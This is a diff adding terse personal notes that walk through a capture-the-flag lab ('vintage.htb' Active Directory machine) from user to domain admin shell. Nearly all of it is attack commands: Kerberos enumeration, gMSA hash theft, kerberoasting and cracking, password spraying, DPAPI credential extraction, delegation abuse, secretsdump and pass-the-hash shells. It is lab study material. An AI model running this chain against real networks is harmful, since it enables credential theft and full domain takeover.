@@ -1,0 +1,69 @@
+-- Until get user shell
+-- basic setup
+nmap -> /etc/hosts <ip> dc01 dc01.vintage.htb vintage.htb
+nxc smb dc01.vintage.htb -u p.rosa -p Rosaisbest123 -k (Credential provided) -> success
+
+need to update /etc/krb5.conf
+
+[libdefaults]
+    default_realm = EXAMPLE.COM
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    ticket_lifetime = 24h
+    forwardable = true
+
+[realms]
+    EXAMPLE.COM = {
+        kdc = kdc.example.com
+        admin_server = kdc.example.com
+    }
+
+[domain_realm]
+    .example.com = EXAMPLE.COM
+    example.com = EXAMPLE.COM                                       # Just convert EXAMPLE.COM -> VINTAGE.HTB, example.com -> vintage.htb, kdc.example.com -> dc01.vintage.htb 
+
+-- bloodhound
+bloodhound-python -c all -u p.rosa -p Rosaisbest123 -ns <ip> -d vintage.htb -> upload on server
+
+fs01$ --- member of --- pre-windows 2000 compatible group: fs01$ might have the same password as id if Assign this computer as a pre-windows 2000 computer checked
+nxc ldap <ip> -d vintage.htb -u 'fs01$' -p 'fs01' -k -> success
+kinit fs01 -> put password -> get TGT as fs01$
+nxc ldap -d dc01.vintage.htb -u 'fs01$' -k --gmsa -dc-ip <ip> -> fail because nxc uses ldaps automatically, need to change the code itself or use bloodyAD
+bloodyAD -d vintage.htb --host dc01.vintage.htb -u fs01 -p 'fs01' -k  get object 'gmsa01$' --attr msDS-ManagedPassword -> get gmsa01$ ntlm hash
+
+gmsa01$ -- add self --- servicemanagers
+bloodyAD -d vintage.htb -u 'gmsa01$' -p <ntlm> --host dc01.vintage.htb -f rc4 -k add groupMember ServiceManagers 'gmsa01$'
+  -> added to ServiceManager, can modify svc_sql(disabled), svc_ldap, svc_ark
+
+getTGT.py 'vintage.htb/gmsa01$' -dc-ip <ip> -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178 # Get TGT as gmsa01$
+KRB5CCNAME=gmsa01$.ccache bloodyAD -d vintage.htb -u 'gmsa01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' --host dc01.vintage.htb -f rc4 -k remove uac svc_sql -f ACCOUNTDISABLE # enable user svc_sql
+
+option 1. use targetedkerberoast
+  KRB5CCNAME=gmsa01$.ccache targetedKerberoast/targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb # extract all svc_ hashes
+option 2. manually set spn to svc_ and nxc ldap
+  bloodyAD -d vintage.htb -u 'gmsa01$' -p 'b3a15bbdfb1c53238d4b50ea2c4d1178' --host dc01.vintage.htb -f rc4 -k set object <svc_users> ServicePrincipalName -v '<anything>' # For all 3 users
+  nxc ldap dc01.vintage.htb -u 'gmsa01$' -H 'b3a15bbdfb1c53238d4b50ea2c4d1178' -k --kerberoasting nxc.hashes
+
+hashcat <hashfile> rockyou.txt -> get one password cracked
+cat <bloodhound user output.json> | jq '.data[].Properties | select(.samaccountname) | .samaccountname' | tr -d '"' > users.txt
+nxc ldap dc01.vintage.htb -u users.txt -p <password> -k --continue-on-success -> c.neri
+
+klist c.neri; -> put password and get ticket
+evil-winrm -i dc01.vintage.htb -r vintage.htb
+
+-- Until get admin shell
+#Very unstable shell and download doesn't work
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6")) -> base64 -d > <Credential file>
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847")) -> base64 -d > <Key file 1>
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b")) -> base64 -d > <Key file 2>
+
+pypykatz dpapi prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' '<password>' > <prekey file> -> get prekey
+pypykatz dpapi masterkey <Key file> <prekey file> -o <readable key file> -> get 2 readable keys # Do it for both key files
+pypykatz dpapi credential <readable key file> <credential file> -> Only work for one key file and get binary password for c.neri_adm -> python: <binary>.decode('utf-16le')
+
+  c.neri_adm --- Member of --- DelegatedAdmins --- Allowed To Act(Impersonate allowed) --- dc01
+bloodyAD -d vintage.htb -u c.neri_adm -p <password> --host dc01.vintage.htb -k add groupMember DelegatedAdmins 'fs01$' -> Add fs01(which has spn) to DelegatedAdmins
+getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' -dc-ip <ip> 'vintage.htb/fs01$:fs01' -> get impersonate Administrator ticket
+KRB5CCNAME=<.ccache file> secretsdump.py -k dc01.vintage.htb -> get all user hashes, but evil-winrm to administrator doesn't work
+getTGT.py -hashes :<ntlm of l.bianchi_adm> vintage.htb/l.bianchi_adm@vintage.htb -> Get l.bianchi_adm's hash
+KRB5CCNAME=<bianchi .ccache> wmiexec.py -k dc01.vintage.htb -> Get admin shell
